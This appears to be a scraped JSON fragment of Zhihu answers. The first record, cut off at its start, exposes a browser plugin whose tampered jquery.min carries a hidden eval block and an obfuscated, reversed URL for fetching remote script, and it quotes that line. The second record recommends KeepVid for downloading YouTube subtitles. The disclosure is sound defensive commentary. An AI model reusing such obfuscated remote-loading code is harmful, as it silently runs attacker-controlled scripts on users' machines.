上的脚本，所有使用插件的用户都会执行最新的代码，听着是不是跟某款软件很像？&lt;br&gt;&lt;br&gt;注意上面代码中这段var u = &quot;moc.ppaanis.gollru//:sptth&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;);&lt;br&gt;卑劣的本性一览无余！！</textarea>\n\n\n<div class=\"zh-summary summary clearfix\">\n\n楼主你观察的很仔细，判断也非常准确 这个插件里面的jquery.min确实做过手脚，原版的 jquery.1.7.2.min 是 93K，而这个版本是 123K 它与原版的区别在于最后多了一段 eval(function(){...}(...)) ，而且用了一些技巧来隐藏代码 手段真是太卑劣了！ ====解决…\n\n<a href=\"/question/20527726/answer/15387081\" class=\"toggle-expand\">显示全部</a>\n\n</div>\n\n\n\n<p class=\"visible-expanded\"><a itemprop=\"url\" class=\"answer-date-link meta-item\" data-tooltip=\"s$t$发布于 2012-10-13\" target=\"_blank\" href=\"/question/20527726/answer/15387081\">编辑于 2012-10-13</a></p>\n\n",
    "link": "https://zhihu.com/question/20527726/answer/15387081"
  },
  {
    "question": "\n怎样下载 Youtube 视频的字幕？\n",
    "author": "胡悦旻",
    "content": "\n\n<textarea hidden class=\"content\">Keepvid&lt;br&gt;&lt;a href=&quot;//link.zhihu.com/?target=http%3A//keepvid.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;KeepVid: Download online videos from Youtube, Vimeo, Twitch.Tv, Facebook, Dailymotion, Youku, Tudou, Metacafe and more!&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;br&gt;看看支持列表&lt;br&gt;&lt;img src=&quot;https://pic4.zhimg.com/6e4d32793eaab72229e2ea5f13bbd297_b.jpg&quot; data-rawwidth=&quot;1057&quot; data-rawheight=&quot;365&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1057&quot; data-original=&quot;https://pic4.zhimg.com/6e4d32793eaab72229e2ea5f13bbd297_r.jpg&quot;&gt;&lt;br&gt;你能想到的都支持，包括国内的土豆，奇艺，酷6，优酷&lt;br&gt;粘个网址进去&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/cab61e2d8741374da0468f835cb21ad0_b.jpg&quot; data-rawwidth=&quot;684&quot; data-rawheight=&quot;407&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;684&quot; data-original=&quot;https://pic1.zhimg.com/cab61e2d8741374da0468f835cb21ad0_r.jpg&quot;&gt;倒数第二个就是SRT格式的字幕了。除此之外视频音频也是一应俱全，堪称观看youtube的必备秘方。</textarea>\n\n\n<div class=\"zh-summary summary clearfix\">\n<img src=\"https://pic4.zhimg.com/6e4d32793eaab72229e2ea5f13bbd297_200x112.jpg\" data-rawwidth=\"1057\" data-rawheight=\"365\" class=\"origin_image inline-img zh-lightbox-thumb\" data-original=\"https://pic4.zhimg.com/6e4d32793eaab72229e2ea5f13bbd297_r.jpg\">\nKeepvid <a href=\"//link.zhihu.com/?target=http%3A//keepvid.com/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">KeepVid: Download online videos from Youtube, Vimeo, Twitch.Tv, Facebook, Dailymotion, Youku, Tudou, Metacafe and more!<i class=\"icon-external\"></i></a> 看看支持列表 你能想到的都支持，包括国内的土豆，奇艺，酷6，优酷 粘个网址进去 倒数第二个就是SRT格式的字幕了。除…\n\n<a href=\"/question/19647719/answer/49450927\" class=\"toggle-expand\">显示全部</a>\n\n</div>\n\n\n\n<p class=\"visible-expanded\"><a itemprop=\"url\" class=\"answer-date-link meta-item\" target=\"_blank\" href=\"/question/19647719/answer/49450927\">发布于 2015-05-30</a></p>\n\n",
    "link": "https://zhihu.com/question/19647719/answer/49450927"
  }
]